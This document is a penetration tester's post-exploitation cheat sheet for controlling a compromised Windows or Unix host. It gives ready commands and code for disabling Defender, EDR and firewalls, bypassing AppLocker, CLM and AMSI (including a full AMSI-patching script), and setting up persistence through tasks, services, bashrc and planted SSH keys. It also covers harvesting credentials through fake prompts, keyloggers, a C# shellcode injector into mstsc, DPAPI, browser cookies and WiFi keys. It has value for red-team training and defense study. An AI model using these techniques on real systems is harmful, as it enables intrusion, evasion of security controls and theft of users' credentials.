# __Get control over the initial access system__
>Author: Pieter Miske
---
### __Get situational awareness:__
##### _Enumerate session and user information:_
- Get current user privileges:
	- \([Seatbelt](https://github.com/GhostPack/Seatbelt)\): ```seatbelt.exe TokenGroups TokenPrivileges UAC UserRightAssignments```
	- \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```whoami```
- Enumerate the currently attached user sessions both local and over rdp (CS-Situational-Awareness-BOF): ```enumLocalSessions```
- Enumerates all sessions on the specified computer or the local one (CS-Situational-Awareness-BOF): ```netsession (<IP or FQDN target system>)```
- List local groups (CS-Situational-Awareness-BOF): ```netLocalGroupList```
- List local group members (CS-Situational-Awareness-BOF): ```netLocalGroupListMembers```
- Show titles from processes with active windows from current user \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psw```
- Accessible secrets based on local and domain privileges of current user \(Seatbelt\): ```seatbelt.exe KeePass CloudCredentials CredEnum CredGuard DpapiMasterKeys LAPS PuttyHostKeys RDCManFiles PuttySessions SecPackageCreds SuperPutty FileZilla WindowsAutoLogon WindowsCredentialFiles WindowsVault```
- User session info \(Seatbelt\): ```seatbelt.exe RDPSavedConnections RDPSessions LogonEvents LogonSessions```
- Recently used/modified/deleted files \(Seatbelt\): ```seatbelt.exe ExplorerMRUs OfficeMRUs RecycleBin OutlookDownloads```
- General user info \(Seatbelt\): ```seatbelt.exe -group=user```

##### _Enumerate general system and network information:_
- Show detailed information from all processes running on the system and provides a summary of installed security products and tools \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psx```
- Get a list of running processes including PID, PPID and ComandLine (uses wmi) \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```tasklist```
- Prints process environment variables (CS-Situational-Awareness-BOF): ```env```
- Display system locale language, locale id, date/time, and country (CS-Situational-Awareness-BOF): ```locale```
- List system boot time (CS-Situational-Awareness-BOF): ```uptime```
- Lists named pipes (CS-Situational-Awareness-BOF): ```listpipes```
- List local system, config, user and software info \([Seatbelt](https://github.com/GhostPack/Seatbelt)\): ```seatbelt.exe OSInfo LocalGPOs LocalGroups LocalUsers InstalledProducts WSUS NTLMSettings```
- General system info \(Seatbelt\): ```seatbelt.exe -group=system```
- List ipv4, hostname and dns server info (CS-Situational-Awareness-BOF): ```ipconfig```
- List ARP table (CS-Situational-Awareness-BOF): ```arp```
- Pulls dns cache entries (CS-Situational-Awareness-BOF): ```listdns```
- Prints ipv4 configured routes (CS-Situational-Awareness-BOF): ```routeprint```
- Makes a dns query (CS-Situational-Awareness-BOF): ```nslookup <FQDN system>```
- Network and share info \(Seatbelt\): ```seatbelt.exe DNSCache NetworkProfiles NetworkShares TcpConnections```

##### _Enumerate defensive measures:_
- List installed security products and tools (also lists processes) \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Psx```
- List process DLL's (default current) to determine if the process was injected by EDR/AV: \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): ```listmods (<pid>)```
- Enumerate installed services to check the signing cert against known EDR/AV vendors (CS-Situational-Awareness-BOF): ```driversigs```
- List AV products \([Seatbelt](https://github.com/GhostPack/Seatbelt)\): ```seatbelt.exe AMSIProviders AntiVirus McAfeeConfigs SecurityPackages WindowsDefender```
- List AV products: ```wmic /node:localhost /namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /format:List```
- List AV's, EDR's and logging tools \([SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)\): ```SharpEDRChecker.exe```
- Applocker and system restriction \(Seatbelt\): ```seatbelt.exe AppLocker LSASettings```
- Verify if PowerShell Constrained Language Mode \(CLM\) is enabled: ```$ExecutionContext.SessionState.LanguageMode```
- Firewall configuration: 
	- Show detailed list of firewall rules \([Firewall\_Enumerator\_BOF](https://github.com/EspressoCake/Firewall_Walker_BOF)\): ```fw_walk display```
	- List all firewall rules \(Seatbelt\): ```seatbelt.exe WindowsFirewall```
	- List details specific firewall rule: ```netsh advfirewall firewall show rule name="<all | name specific rule>" dir=in```


---
### __Bypass defenses:__
##### _Disable EDR/AV solution:_
>These methods require elevated privileges. 
- Make Defender useless by leveraging [Backstab](https://github.com/Yaxser/Backstab) and [KillDefender](https://github.com/Octoberfest7/KillDefender_BOF) as BOF: 
	- Check the integrity level of a process ([KDStab](https://github.com/Octoberfest7/KDStab)\): ```kdstab /NAME:<MsMpEng.exe> /CHECK```
	- Strip a process of its privileges and set its token to Untrusted (KDStab): ```kdstab /NAME:<process name (e.g. MsMpEng.exe)> /STRIP```
	- Kill a PPL protected process (KDStab): ```kdstab /NAME:<MsMpEng.exe> /KILL```
- Kill EDR Protected Processes by leveraging sysinternals’ (signed) ProcExp driver ([Backstab](https://github.com/Yaxser/Backstab)\): ```backstab.exe -n <name EDR process> -k -d <dir to extract ProcExp to ( e.g. c:\\temp\\driver.sys)>```
- Make defender useless by removing its token privileges and lowering the token integrity but keep it running: 	
	- Check MsMpEng.exe's token integrity \([KillDefender](https://github.com/Octoberfest7/KillDefender_BOF)\): ```killdefender check```
	- Remove privileges and set MsMpEng.exe token to untrusted (KillDefender): ```killdefender kill```
- Use Token Stomping to remove any token privileges that an EDR/AV process needs to effectively do its job \([TokenStomp](https://github.com/MartinIngesen/TokenStomp)\): ```TokenStomp.exe <process name (e.g. MsMpEng.exe)>```
- Refresh DLL's and remove their hooks for CS \([unhook\-bof](https://github.com/rsmudge/unhook-bof)\): ```unhook```
- Disable Windows Defender via PowerShell: ```Set-MpPreference -DisableRealtimeMonitoring $true```

##### _Disable/enable firewall:_
>These methods require elevated privileges. 
- Check status firewall (can be run from low-priv user context) \([Firewall\_Enumerator\_BOF](https://github.com/EspressoCake/Firewall_Walker_BOF)\): ```fw_walk status```
- Disable firewall \(Firewall\_Enumerator\_BOF\): ```fw_walk disable```
- Enable firewall \(Firewall\_Enumerator\_BOF\): ```fw_walk enable```
- Disable firewall: ```netsh Advfirewall set allprofiles state off```

##### _Bypassing Applocker:_
AppLocker is Microsoft's application whitelisting technology that can restrict the executables, libraries and scripts that are permitted to run on a system\. AppLocker rules are split into 5 categories \- Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement \(enforced, audit only, none\)\. If an AppLocker category is "enforced", then by default everything within that category is blocked\. Rules can then be added to allow principals to execute files within that category based on a set of criteria.
>Trying to execute anything that is blocked by AppLocker looks like this: "This program is blocked by group policy\. For more information, contact your system administrator\."

- Find writeable directories within a "trusted" paths:
    - Check if you have at least write access to the following common places that are not blocked by the default applocker rules for authenticated users: icacls\.exe <path \(e\.g\. C:\\Windows\\Tasks\)>
    	- RW: ```C:\Windows\Tasks```
	    - RW: ```C:\Windows\System32\spool\drivers\color```
	    - RW: ```C:\Windows\tracing```
	    - RW: ```C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys```
	    - W: ```C:\Windows\System32\Tasks ```
    - Analyse Applocker Policy to find weak spots:
	    - 1\. Extract the Applocker Policy: ```Get-AppLockerPolicy -Effective -Xml | Set-Content ('C:\Users\Public\Documents\ApplockerPolicy.xml')```
	    - 2\. Download the generated ‘ApplockerPolicy\.xml’ file to your own system
	    - 3\. Analyse the xml file if there are any exception rules made for directories were users are allowed to execute code and check for overly permissive rules that use wildcards \(e\.g\. "%OSDRIVE%\\\*\\Packages\\\*"\)\. This means you could create a folder called "Packages" \(or whatever the name is\) anywhere on C:\\ \(e\.g\. C:\\Users\\Public\\Documents\\Packages\) and run exe's from there\.  
- Use \.DLL instead of \.EXE: DLL's enforcement is very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break\.
- Become Local Admin: by default, AppLocker is not applied to Administrators\.
- Executing untrusted code via LOLBAS's: leverage trusted Windows executables from the [LOLBAS](https://lolbas-project.github.io/) project that can run your code and bypass any applocker rules \(check the "Payload" section for inspiration)\.

##### _Bypass PowerShell Constrained Language Mode \(CLM\):_
When AppLocker is enabled PowerShell is placed into Constrained Language Mode \(CLM\), which restricts it to core types\. CLM can also be enabled locally without AppLocker being enabled\. 
>Disabling CLM may require you to start a new PS session afterwards.
- Powershell automation for C\#: leverage the powershell automation dll in your C\# code to bypass CLM \(check the "Payload" section for inspiration\)
- Powerpick Cobalt Strike \(OPSEC: this is a fork&run operation\): an "unmanaged" implementation of tapping into a PowerShell runspace without using powershell\.exe: ```powerpick <command>```
- PowerShdll: Does not require access to powershell\.exe as it uses powershell automation dlls\.
	- 1\. Upload a compiled version of [PowerShdll\.dll](https://github.com/p3nt4/PowerShdll) to the target system
	- 2\. Execute PowerShdll\.dll \(maybe press enter few times\): ```rundll32 .\PowerShdll.dll,main -i```
- Local configured CLM \(requires admin privileges\): this type of CLM can be bypassed by editing the global environment variable named "\_\_PSLockdownPolicy"\. When its value is equal to 8, PowerShell operates in Full Language Mode: ```setx __PSLockdownPolicy "0" /M```

##### _AMSI bypass:_
- Corrupt AmsiOpenSession: PS one\-liner that overwrites the context structure header and corrupts it and forces AmsiOpenSession to error out: ```$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)```
- Patch AMSI: save as script\.ps1 and run in PS session to bypass AMSI:
    ```PS
    function LookupFunc {
        Param ($moduleName, $functionName)
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),$functionName))
    }
    
    function getDelegateType {
        Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
        return $type.CreateType()
    }
    
    [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
    $oldProtectionBuffer = 0
    $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
    $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
    
    $buf = [Byte[]] (0x48, 0x31, 0xC0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
    
    $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
    ```

##### _Exclusions:_
Most antivirus solutions allow you to define exclusions to on\-demand and real\-time scanning\. Windows Defender allows admins to add exclusions via GPO, or locally on a single machine.
- List the current exclusions \(can be handy to run via agentless technique on remote target\): ```Get-MpPreference | select Exclusion*```
- Add your own exclusion: ```Set-MpPreference -ExclusionPath "<path>"```

##### _Smartscreen:_
If Smartscreen is enabled and your payload.exe is not signed, don't download your hosted executable directly from a webserver. Smartscreen will "mark" the payload and make it impossible to execute without GUI access and/or high privileges. 

---
### __Get persistent access:__
##### _Windows persistent access techniques:_
>The following commands are examples and must be modified to your needs\. For the SharpPersist tool it is recommended to first run the "\-m list" \(to list all present entries for the specified persistence technique\) and the "\-m check" argument \(verifies if specified persistence technique will work\) before executing the actual persistence command\. 
- New Scheduled Task \(userland persistence & NT AUTHORITY\SYSTEM). This persistence technique will create a new scheduled task in the context of the current user/SYSTEM privileges (for a SYSTEM task, first elevate to NT AUTHORITY\SYSTEM\). By default the task is set as a "daily" task but can be changed to "hourly" or "logon" \(logon requires admin privs\):
    - \([SharpPersist](https://github.com/fireeye/SharPersist/wiki)\): ```SharPersist.exe -t schtask -c "<payload.exe to execute>" (-a "<additional arguments>") -n "<new scheduled task name>" -m add (-o logon)```
- Registry \(userland persistence\): This persistence technique will create a registry key in "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" or "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" and run a payload in the context of the user account that added the registry key \(the "env" option can be used for registry obfuscation and must also be specified when using the "remove" option\) 
    - \(SharpPersist\): ```SharPersist.exe -t reg -c "<payload.exe to execute>" (-a "<additional arguments>") -k "<hkcurun | hkcurunonce>" -v "<registry value name>" -m add (-o env)```
- Startup Folder \(userland persistence\): This persistence technique creates a .LNK file and places it in the user's startup folder \(timestamp of the new LNK file is modified to 60\-90 days before creation and placed in the folder "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\example\.lnk"\) 
    - \(SharpPersist\): ```SharPersist.exe -t startupfolder -c "<binary.exe to execute>" (-a "<additional arguments>") -f "<LNK file name>" -m add```
- Create new service \(NT AUTHORITY\SYSTEM persistence\): This creates a new service that will establish SYSTEM level persistence on the current host \(OPSEC: this will directly start the service and therefore execute the payload\) (make sure the current context is NT AUTHORITY\SYSTEM\) \([SharpStay](https://github.com/0xthirteen/SharpStay)\): ```SharpStay.exe action=CreateService servicename=<name of new service> command="<command to run>"```
- Remote Registry Backdoor (DAMP) \(NT AUTHORITY\SYSTEM persistence\): This technique implements a host\-based DACL backdoor to enable remote retrieval of secrets from a machine, including SAM and domain cashed hashes\. 
    - 1\. Run the 'Add\-RemoteRegBackdoor\.ps1' on the target machine from which you would like to harvest the machine account hash \([DAMP](https://github.com/HarmJ0y/DAMP)\): ```Add\-RemoteRegBackdoor -Trustee <domain>\<already owned useraccount>```
    - 2\. From the already owned user account, import the 'RemoteHashRetrieval\.ps1' file and execute the following command to obtain the target machine hash \(DAMP\): ```Get-RemoteMachineAccountHash -ComputerName <FQDN target computer> -Verbose```
    - 3\. Forge a silver ticket to gain access to the target system\. 

##### _Unix persistent access techniques:_

- Setup persistence via user config files:
    - 1\. In the current user's home directory, select either the '\.bash\_profile' file \(executed when initially logging in to the system\) or the '\.bashrc' file \(executed when a new terminal window is opened\) for modification\.
    - 2\. Add a reverse shell command or other action to the file that will allow for persistent access: ```echo "<command to run>" >> ~/.bashrc```
- Setup persistent access through SSH to target host:
    - 1\. Create \.ssh directory on target host if not present: ```mkdir .ssh```
    - 2: Give the \.ssh directory the correct permissions: ```chmod 700 .ssh```
    - 3\. If the authorized\_keys doen't exist, create it: ```touch authorized_keys```
    - 4\. On your own system create new ssh key pair: ```ssh-keygen -f <random name key>```
    - 5\. Copy the \.pub key and add it to the authorized\_keys file on the target system: ```echo '<key string>' >> authorized_keys```
    - 6\. Give the authorized\_keys file the correct permissions: ```chmod 600 authorized_keys```
    - 7\. On your own system, give the private key the correct permissions: ```chmod 600 <private key>```
    - 8\. Login from your own host to target host: ```ssh -i <private key> <username>@<target ip>```


---
### __Obtain secrets via user interaction:__

##### _Run credential pop\-up:_ 
- Customizable Windows authentication prompt that can verify if the entered credentials are valid on the local system or in the domain \([AskNicely](https://github.com/pietermiske/AskNicely)\): ```AskNicely.exe (/verify) (/title:"<Custom title>" /message:"<Custom message>")```
- Simple popup using BOF that isn’t persistent or checks if creds are valid \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): ```Askcreds (<optional text as window title>)```

##### Keylogger:
- PoshC2: Gives nice output and writes in file \(process can't be terminated\): ```start-keystrokes-writefile```
- Cobalt Strike: Inject a keylogger into a given process \(kill with jobkill <ID>\) (OPSEC: this is using fork&run): ```keylogger (<PID>) (<x86|x64>)```

##### Screenshots:
- PoshC2: \(screenshots are saved in: /var/poshc2/<project>/downloads/\): ```get-screenshot```
- Cobalt Strike: Inject in given process and take screenshot: ```screenshot (<PID>) (<x86|x64>) (<runtime in seconds>)```

##### RDP API Hooking: 
RDP Credentials can be captured by intercepting function calls \(API Hooking\) in mstsc\.exe, the native windows binary that creates connections to Remote Desktop Services\. This tool will look for new instances of mstsc\.exe, inject the RemoteViewing shellcode and save the encrypted credentials into a file\. *
>This technique doesn’t require elevated privileges\. 
- 1\. Download and compile both the [RemoteViewing](https://github.com/FuzzySecurity/Sharp-Suite/tree/master/RemoteViewing) and Clairvoyant tool \(don’t forget to restore the NuGet packages if required\)
- 2\. Convert the created RemoteViewing.exe tool to shellcode using Donut \([Donut](https://github.com/TheWover/donut)\): ```.\donut.exe –f 7 <path to RemoteViewing.exe> -o .\RemoteViewingSC.cs``` 
- 3\. Create a shellcode injection binary and add the generated shellcode \(from RemoteViewingSC\.cs\) in the "SHELLCODE" placeholder\.
    ```Csharp
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Collections.Generic;
    using System.Threading;
    
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
    
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;
    
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
    
        [DllImport("kernel32")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static int SW_HIDE = 0;
    } 
    
    class MstscInjector
    {
        // Injects shellcode in a process via its PID
        public static void InjectShellcode(int rPid, byte[] shellcode)
        {
            // Get a handle to the remote process with required permissions
            IntPtr pHandle = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION |
                Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, rPid);
            // Allocate memory with PAGE_EXECUTE_READWRITE permissions
            IntPtr sAddress = Win32.VirtualAllocEx(pHandle, IntPtr.Zero, shellcode.Length,
                Win32.MEM_COMMIT, Win32.PAGE_EXECUTE_READWRITE);
            // Write RemoteViewing Shellcode to the target process
            Win32.WriteProcessMemory(pHandle, sAddress, shellcode, new IntPtr(shellcode.Length), 0);
            // Execute Shellcode
            IntPtr rThread = Win32.CreateRemoteThread(pHandle, new IntPtr(0), new uint(), sAddress,
                new IntPtr(0), new uint(), new IntPtr(0));
            // Restore memory permissions to PAGE_EXECUTE_READ
            IntPtr sAddress2 = Win32.VirtualAllocEx(pHandle, IntPtr.Zero, shellcode.Length,
                Win32.MEM_COMMIT, Win32.PAGE_EXECUTE_READ);
            return;
        }
        // Main function
        public static void Main(string[] args)
        {
            string rProcess = "mstsc"; // RDP Process Name
            // List with already injected PIDs
            List<int> injectedProcs = new List<int>();
            // RemoteViewing Shellcode
            byte[] shellcode= new byte[285950] {SHELLCODE PLACEHOLDER};
            Console.WriteLine("[+] Searching for {0} instances", rProcess);
            while (true)
            {
                try
                {
                    Process[] procs = Process.GetProcesses();
                    foreach (Process proc in procs)
                    {
                        // Checks for mstsc processes not injected before
                        if ((proc.ProcessName == rProcess) && (!injectedProcs.Contains(proc.Id)))
                        {
                            Console.WriteLine("[>] Injected in PID: {0}", proc.Id);
                            InjectShellcode(proc.Id, shellcode); // Inject Shellcode
                            injectedProcs.Add((int)proc.Id); // Add the PID to injected procs list
                        }
                    }
                }
                catch {} // Silently continue execution if something fails
                Thread.Sleep(5000); // Sleeps for 5 Seconds
            }
        }
    }
    ```
- 4\. Compile the RemoteViewInjector\.cs file: ```csc .\RemoteViewingSC.cs```
- 5\. Execute RemoteViewInjector\.exe tool on the target system \(by default the result is stored in "\_wasRDP36D7\.tmp" located in the "C:\\Users\\<target user>\\AppData\\Local\\Temp\\" folder\): ```.\RemoteViewInjector.exe```
- 6\. Decrypt and show the stored \(intercepted\) RDP creds \(run in same folder as RemoteViewInjector\.exe\): ```.\Clairvoyant.exe```
- 7\. \(optional\) If you want to repeat the process, first delete the "\_wasRDP36D7\.tmp" file stored in "C:\\Users\\<user>\\AppData\\Local\\Temp\\"\.

---
### __Search for stored secrets on the system:__
##### _Credential Manager password harvesting \(DPAPI\):_
- Targeting current user account \(doesn't require elevated privs\):
	- 1\. Check if there are blobs present on disk: ```ls C:\Users\<username>\AppData\Local\Microsoft\Credentials (-Force)```
	- 2\. \(optional\) Check what they are used for \(e\.g target=TERMSRV means RDP\): ```vaultcmd /listcreds:"Windows Credentials" /all```
	- 3\. Check which 'guidMasterKey' value is assocatiated with the blob: ```mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<blob value string>```
	- 4\. List Master Key information and note the full path to the needed guidMasterKey: ```ls C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-*```
	- 5\. Decrypt the MasterKey and copy the 'key' value: 
		- Via DC RPC function: the "legitimate" RPC service, exposed on the DC, is used for better OPSEC: ```mimikatz dpapi::masterkey /in:C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-<SID>\<guidMasterKey value> /rpc```
		- Via credentials: ```mimikatz dpapi::masterkey /in:<MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected```
	- 6\. Use the 'key' value to decrypt the blob: ```mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<blob value string> /masterkey:<key value>```
- Targeting multiple user accounts and retrieve all stored user credentials from the Credential Manager on the current system \(requires DA privileges; access to DC backup; or DA Read\-Only access to DC\):
	- Cached MasterKey: triage all reachable user masterkeys and decrypt them if MasterKey is cached \([SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)\): ```SharpDPAPI.exe triage```
	- DPAPI Backup key:  
		- 1\. Retrieve the domain controller's DPAPI backup key which can be used to decrypt master key blobs for any user in the domain \(the key never changes\) \(SharpDPAPI\): ```SharpDPAPI backupkey (/server:<FQDN DC>) /file:C:\<path to>\key.pvk```
		- 2\. Using a domain DPAPI backup key to first decrypt any discoverable masterkeys and then search for Credential files and decrypt them \(SharpDPAPI\): ```SharpDPAPI credentials /pvk:C:\<path to>\key.pvk```

##### _Browser login and cookie harvesting \(DPAPI\):_
>Some websites have set restriction on the reuse of cookies like: single cookie use; restricted by IP, device or some sort of fingerprint\. Therefore, it is not always possible to leverage an obtained cookie.
- Targeting current user account \(doesn't require elevated privs\):
	- Stored Credentials:
		- 1\. Check if the 'Login Data' file has a value higher than 38k\-42k, which is a good indicator that credentials are stored: ```ls C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default```
		- 2\. Decrypt and dump the credentials:
			- Chrome/Edge \([SharpChromium](https://github.com/djhohnstein/SharpChromium)\): ```SharpChromium.exe logins```
			- Chrome/Firefox/IE/Edge \([SharpWeb](https://github.com/djhohnstein/SharpWeb)\): ```sharpweb.exe all```
	- Stored Cookies & Browser history:
		- 1\. Retrieve user's history with a count of each time the URL was visited \(SharpChromium]\): ```SharpChromium.exe history```
		- 2\. Retrieve the user's cookies \(if URL’s are passed, then return only cookies matching those URL’s/domain’s\) \(SharpChromium]\): ```SharpChromium.exe cookies (<domain (e.g. github.com)>)```
		- 3\. Copy the cookie in JSON format and import it via the [Cookie\-Editor](https://addons.mozilla.org/nl/firefox/addon/cookie-editor/) plugin\. 
- Targeting multiple user accounts and retrieve all saved browser credentials on the current system \(requires DA privileges; access to DC backup; or DA Read\-Only access to DC\):
	- 1\. Retrieve the domain controller's DPAPI backup key \([SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)\): ```SharpDPAPI backupkey (/server:<FQDN DC>) /file:C:\<path to>\key.pvk```
	- 2\. Using a domain DPAPI backup key to first decrypt any discoverable masterkeys and then search for Vaults and decrypt them \(SharpDPAPI\): ```SharpDPAPI vaults /pvk:C:\<path to>\key.pvk```

##### _Mozilla Thunderbird email & credential dumping:_
- Retrieve saved credentials from Thunderbird \([Thunderfox](https://github.com/V1V1/SharpScribbles)\): ```.\Thunderfox.exe creds (/target:"C:\Users\<username>\AppData\Roaming\Thunderbird\Profiles\<string>.default-release")```
- Retrieve a list of the user's Thunderbird contacts \(Thunderfox\): ```.\Thunderfox.exe contacts```
- Retrieve a detailed list of all emails in Thunderbird \(Thunderfox\): ```.\Thunderfox.exe listmail```
- Read a specific email \(Thunderfox\): ```.\Thunderfox.exe readmail /id:<email ID>```

##### _Outlook e\-mail export:_
In Outlook there are PST and OST files\. PST is used to store file locally whereas OST is an Offline storage used when no server connection is present\.
- 1\. Check the following location for PST or OST mail files:
	```
    C:\users\<username>\AppData\Local\Microsoft\Outlook\
	C:\Users\<username>\Roaming\Local\Microsoft\Outlook\
    ```
- 2\. Kill the outlook process and download all the files
- 3\. To view the content of the files import them in a compatable email client \(free OST viewer application\)

##### _Dump stored WiFi passwords:_
This technique dumps all stored WiFi passwords on the system and can be run without admin privileges\. 
- [Get-WLANPass.ps1](https://github.com/zenosxx/PoshC2/blob/master/Modules/Get-WLANPass.ps1): ```get-wlanpass```
- Native PowerShell:
	- 1\. Show all stored wireless AP names: ```netsh wlan show profile```
	- 2\. Select a AP name copy/paste it in the following command and dump the associated stored password: ```netsh wlan show profile <AP name> key=clear | Select-String -Pattern "Key Content"```

##### _Search registry for passwords:_
- 1\. Remotely dump HKEY\_USERS registry \([impacket](https://github.com/SecureAuthCorp/impacket)\): ```reg.py <domain>/<usename>@<target ip or FQDN> (-hashes :<NTLM>) query -keyName HKU -s |tee hku.reg```
- 2\. Search for stored cleartest passwords \(recommended to search for keywords like "password" or software names\): ```grep "<keyword>" hku.reg (-A3 -B3) -a```

##### _General search queries and tools:_
- Fast file searching and specific keyword identification \(use the '\-c' option to search file contents\) \([SauronEye](https://github.com/vivami/SauronEye)\): ```SauronEye.exe -d C:\<directories to search> -f <filetypes to search for/in (.txt .doc .docx .xls)> (-c) (-k <Keywords to search for (e.g. pass*)>)```
- Recursive file search via PowerShell: ```gci -recurse -include <file name to search for>```
- Recursively list all files in the current directory \(e.g. run from the users home directory\): ```cmd /c dir /S /A```
- Search specific file type (run from C:\): ```findstr /si password *.xml *.ini *.txt``` 
- Search everything that contains the word "password": ```findstr /spin "password" *.*```
- Show hidden files: ```dir -Force```

##### _Files that may contain credentials:_
- Unattend files: ```unattend.xml```
- Web config files: ```web.config```
- System Preparation files \(also search for sysprep\.inf\): ```sysprep.xml```
- FileZilla creds on Windows: 
    ```
	C:\Users\<username>\AppData\Roaming\FileZilla\
	C:\Users\<username>\AppData\Local\FileZilla\
	```
- Powershell scripts/config files: ```C:\Program Files\Windows PowerShell\```
- RDP config files: ```C:\ProgramData\Configs\```
- Keepass/LastPass config files: 
    ```
	C:\Users\<username>\AppData\Roaming\<Keepass | LastPass>
	C:\Users\<username>\AppData\Local\<Keepass | LastPass>
	```
